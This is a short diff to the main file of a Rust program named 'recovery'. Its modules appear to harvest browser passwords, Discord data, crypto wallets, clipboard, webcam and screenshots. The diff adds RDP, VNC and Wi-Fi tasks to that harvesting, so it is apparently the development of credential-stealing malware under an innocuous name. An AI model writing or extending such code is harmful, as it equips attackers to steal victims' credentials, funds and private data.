@@ -10,8 +10,8 @@ use recovery::structured::{
 use recovery::task::{RecoveryError, RecoveryOutcome};
 use recovery::{
     RecoveryContext, RecoveryManager, account_validation, behavioral, clipboard, devops, discord,
-    file_recovery, ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, screenshot,
-    services, system, vpn, wallet, webcam,
+    file_recovery, ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, rdp,
+    screenshot, services, system, vnc, vpn, wallet, webcam, wifi,
 };
 use tracing_subscriber::prelude::*;
 use tracing_subscriber::{EnvFilter, fmt};
@@ -60,6 +60,9 @@ async fn main() -> Result<(), RecoveryError> {
     manager.register_task(account_validation::account_validation_task(&context));
     manager.register_tasks(services::wallet_tasks(&context));
     manager.register_tasks(system::system_tasks(&context));
+    manager.register_tasks(rdp::rdp_tasks(&context));
+    manager.register_tasks(vnc::vnc_tasks(&context));
+    manager.register_task(wifi::wifi_task(&context));
     if recovery::settings::RecoveryControl::global().capture_screenshots() {
         manager.register_task(screenshot::screenshot_task(&context));
     }
